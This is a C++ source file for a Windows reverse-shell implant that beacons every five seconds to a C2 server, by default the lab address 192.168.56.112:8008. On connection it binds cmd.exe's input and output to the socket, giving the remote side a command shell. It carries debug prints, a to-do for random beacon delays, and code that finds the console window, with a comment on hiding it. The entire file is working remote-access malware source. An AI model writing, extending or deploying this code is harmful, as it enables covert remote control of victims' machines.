#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

#include <stdio.h>

// DEBUG, TEMP.
#include <iostream>

void RevShell(char* C2Server, int C2Port)
{
	while (true) {
		std::cout << "[DBG] New while cycle triggered...\n";
		// BEACONING
		// NEED TO IMPLEMENT RANDOM DELAY
		Sleep(5000); // 1000 ms = 1s

		SOCKET tcpsock;
        sockaddr_in addr;
        WSADATA version;
		// WSADATA object - contains details of application state regarding to network
		// Version comparison - whether compiled version of sockets is compatible with the older versions
        WSAStartup(MAKEWORD(2,2), &version);

		std::cout << "[DBG] Creating new socket again..\n";
		// WSASocket vs socket - same functionality, WSA.. has more options to work with.
        tcpsock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = inet_addr(C2Server);
		addr.sin_port = htons(C2Port);

		// This if statement triggers if connection to C&C errored out.
		if (WSAConnect(tcpsock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
			std::cout << "[DBG] Error during connection..\n";
			closesocket(tcpsock);
			WSACleanup();
			// Go to next Beacon interaction if connection failed...
			continue;
		}
		// Else connection successfull..
		else {
			std::cout << "[DBG] Connected to " << C2Server << ":" << C2Port << std::endl;
			
			char RecvData[1024];
			
			std::cout << "[DBG] 0\n";
			memset(RecvData, 0, sizeof(RecvData));
			
			std::cout << "[DBG] 1\n";
			// here waits for any data input from Server
			int RecvCode = recv(tcpsock, RecvData, 1024, 0);
			
			std::cout << "[DBG] 2\n";
			if (RecvCode <= 0){
				std::cout << "[DBG] RECVCODE = 0\n";
				closesocket(tcpsock);
				WSACleanup();
				continue;
			}
			else {
				std::cout << "[DBG] 3\n";
				char Process[] = "cmd.exe";
				STARTUPINFOA sinfo;
				PROCESS_INFORMATION pinfo;
				memset(&sinfo, 0, sizeof(sinfo));
				
				std::cout << "[DBG] 4\n";
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				
				std::cout << "[DBG] 5\n";
				// Socket is Handle for stdin/stdout/stderr descriptors of process
				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) tcpsock;
				
				std::cout << "[DBG] 6\n";
				CreateProcessA(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
				WaitForSingleObject(pinfo.hProcess, INFINITE);
				
				std::cout << "[DBG] 7\n";
				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);
				
				std::cout << "[DBG] 8\n";
				memset(RecvData, 0, sizeof(RecvData));
				
				// here waits after first data portion is received (after 1st input int socket)
				int RecvCode = recv(tcpsock, RecvData, 1024, 0);
				
				std::cout << "[DBG] 9\n";
				if (RecvCode <= 0){
					std::cout << "[DBG] RECVCODE = 0 2nd time\n";
					closesocket(tcpsock);
					WSACleanup();
					continue;
				}
				if (strcmp(RecvData, "exit\n") == 0) {
					exit(0);
				}
			}
		}
	}
}


int main(int argc, char **argv)
{
	// Window handle to work with Console window;
	HWND stealth;
	AllocConsole();

	// Idea of searching window and saying to show it (SW_HIDE to hide)
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_SHOWNORMAL);

	//std::cout << "Work in progres..\n";

	if (argc == 3)
	{
		int port = atoi(argv[2]);
		RevShell(argv[1],port);

	} else {
		char host[] = "192.168.56.112";
		int port = 8008;
		RevShell(host,port);
	}
	return 0;
}
